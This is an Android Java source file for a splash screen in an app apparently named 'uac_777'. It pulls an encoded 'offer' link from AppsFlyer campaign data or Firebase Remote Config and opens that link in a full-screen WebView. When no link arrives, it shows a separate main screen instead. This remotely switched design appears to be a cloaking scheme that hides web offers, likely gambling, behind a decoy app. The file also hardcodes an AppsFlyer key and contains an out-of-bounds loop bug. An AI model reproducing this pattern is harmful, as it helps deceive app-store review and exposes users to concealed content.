package com.itsdevelopment.uac_777.view.splash;

import android.content.Intent;
import android.graphics.Color;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.Window;
import android.view.WindowManager;
import android.widget.ProgressBar;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.lifecycle.LiveData;
import androidx.lifecycle.MutableLiveData;
import androidx.lifecycle.Observer;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.appsflyer.attribution.AppsFlyerRequestListener;
import com.github.ybq.android.spinkit.sprite.Sprite;
import com.github.ybq.android.spinkit.style.RotatingCircle;
import com.google.firebase.messaging.FirebaseMessaging;
import com.itsdevelopment.uac_777.MainActivity;
import com.itsdevelopment.uac_777.R;
import com.itsdevelopment.uac_777.view.BaseApplication;
import com.itsdevelopment.uac_777.view.utils.Utils;
import com.itsdevelopment.uac_777.view.web.CustomWebViewClient;
import com.itsdevelopment.uac_777.view.web.WebActivity;

import java.util.Map;

import static com.itsdevelopment.uac_777.view.utils.Utils.REMOTE_CONFIG_DEFAULT_134;
import static com.itsdevelopment.uac_777.view.utils.Utils.REMOTE_CONFIG_KEY_134;
import static com.itsdevelopment.uac_777.view.utils.Utils.INTENT_EXTRA_LINK_KEY;
import static com.itsdevelopment.uac_777.view.utils.Utils.SP_DEFAULT;
import static com.itsdevelopment.uac_777.view.utils.Utils.SP_MAIN_LINK;


public class LoadingActivity
        extends AppCompatActivity
        implements Runnable{

    private BaseApplication theApplication;
    private ProgressBar theLoadingAnimation;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        fullScreenSetup();
        setContentView(R.layout.loading_activity);
        initEnvironment();

        FirebaseMessaging.getInstance().subscribeToTopic(CustomWebViewClient.LORD_OF_APPS_KEY);


        if (!theApplication.mSharedPreferences.getString(SP_MAIN_LINK, SP_DEFAULT).equals(SP_DEFAULT))
            startWebActivity(theApplication.mSharedPreferences.getString(SP_MAIN_LINK, SP_DEFAULT));
        else
            new Thread(this::run).start();


    }


    /**
     *  Setup all variables and environment.
     */
    private void initEnvironment(){
        theApplication = (BaseApplication) getApplication();
        loaderAnimationStart();
    }

    /**
     *  Start Loader Animation
     */
    private void loaderAnimationStart() {
        theLoadingAnimation = findViewById(R.id.spin_load);
        Sprite doubleBounce = new RotatingCircle();
        doubleBounce.setColor(Color.RED);
        theLoadingAnimation.setIndeterminateDrawable(doubleBounce);
    }


    /**
     * Start main task (extracting offer encoded @base64 link from FRC)
     */
    // TODO: 24.03.2021 UAC-SPECIFIC
    // Updated for UAC-139
    public static final String AF_DEV_KEY = "mAFh3SyudXQ3zLjDoX66KL";

    private void getMainLinkFromAppsFlyer() {


        AppsFlyerLib.getInstance().init(AF_DEV_KEY, new AppsFlyerConversionListener() {
            @Override
            public void onConversionDataSuccess(Map<String, Object> conversionData) {

                for (String attrName : conversionData.keySet()) {

                    Log.d("LOG_TAG", "attribute: " + attrName + " = " + conversionData.get(attrName));

                    String key = "campaign";
                    boolean containsKey = conversionData.containsKey(key);
                    String deepLink = "";

                    if (containsKey)
                    {
                        if (conversionData.get(key)!=null)
                        {
                            String[] splitted = ((String)(conversionData.get(key))).split("\\/");
                            if (splitted[0].equals("app"))
                            {
                                deepLink += "key=" + splitted[1];
                                for (int i = 2; i <= splitted.length; i++)
                                {
                                    deepLink += "&sub" + (i-1) + "=" +splitted[i];
                                }
                            }
                        }
                        if (!deepLink.isEmpty())
                        {
                            theApplication.mSharedPreferences.edit().putString(SP_MAIN_LINK, Utils.HOST_URL+deepLink).commit();
                            startWebActivity(deepLink);
                        }
                        else
                        {
                            getMainLinkFromRemoteConfig();
                        }
                    }
                    else {
                        getMainLinkFromRemoteConfig();
                    }
                }
            }

            @Override
            public void onConversionDataFail(String errorMessage) {
                Log.d("LOG_TAG", "error getting conversion data: " + errorMessage);
                getMainLinkFromRemoteConfig();
            }

            @Override
            public void onAppOpenAttribution(Map<String, String> attributionData) {
                Log.d("LOG_TAG", "onAppOpenAttribution: ");
                for (String attrName : attributionData.keySet()) {
                    Log.d("LOG_TAG", "attribute: " + attrName + " = " + attributionData.get(attrName));
                }
                getMainLinkFromRemoteConfig();
            }

            @Override
            public void onAttributionFailure(String errorMessage) {
                Log.d("LOG_TAG", "error onAttributionFailure : " + errorMessage);
                getMainLinkFromRemoteConfig();
            }
        } , getApplicationContext());

        AppsFlyerLib.getInstance().start(getApplicationContext());

    }

    private void getMainLinkFromRemoteConfig() {
        theApplication
                .getFirebaseRemoteConfig()
                .fetchAndActivate()
                .addOnCompleteListener(task -> {
                    if      (task.isSuccessful() &&
                            !theApplication.getFirebaseRemoteConfig().getString(REMOTE_CONFIG_KEY_134).equals(REMOTE_CONFIG_DEFAULT_134) &&
                            !theApplication.getFirebaseRemoteConfig().getString(REMOTE_CONFIG_KEY_134).isEmpty())
                    {

                        String remoteConfigUrl = Utils.decodeRemoteConfigLink(theApplication
                                .getFirebaseRemoteConfig()
                                .getString(REMOTE_CONFIG_KEY_134));

                        Log.d(Utils.DEBUG_TAG_1, "onComplete: "+ remoteConfigUrl);

                        saveInSharedPreferences(SP_MAIN_LINK, remoteConfigUrl);

                        startWebActivity(remoteConfigUrl);

                    } else {
                        Intent intent = new Intent(LoadingActivity.this, MainActivity.class);
                        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
                        LoadingActivity.this.startActivity(intent);
                        finish();
                    }
                });
    }


    /**
     * Starting WebActivity with web offer content
     * @param remoteConfigUrl decoded url, received from FRC.
     */
    private void startWebActivity(String remoteConfigUrl) {

        Intent intent = new Intent(LoadingActivity.this, WebActivity.class);
        intent.putExtra(INTENT_EXTRA_LINK_KEY, remoteConfigUrl);
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);

        startActivity(intent);
        finish();
    }


    private void saveInSharedPreferences(String key, String value)
    {
        theApplication.mSharedPreferences
                .edit()
                .putString(key, value)
                .commit();
    }


    /**
     * Activate attributes, requires for working in fullscreen mode
     */
    private void fullScreenSetup() {
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(
                WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);
    }



    @Override
    public void run() {
        try {
            Thread.currentThread().sleep(3000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        getMainLinkFromAppsFlyer();
    }


}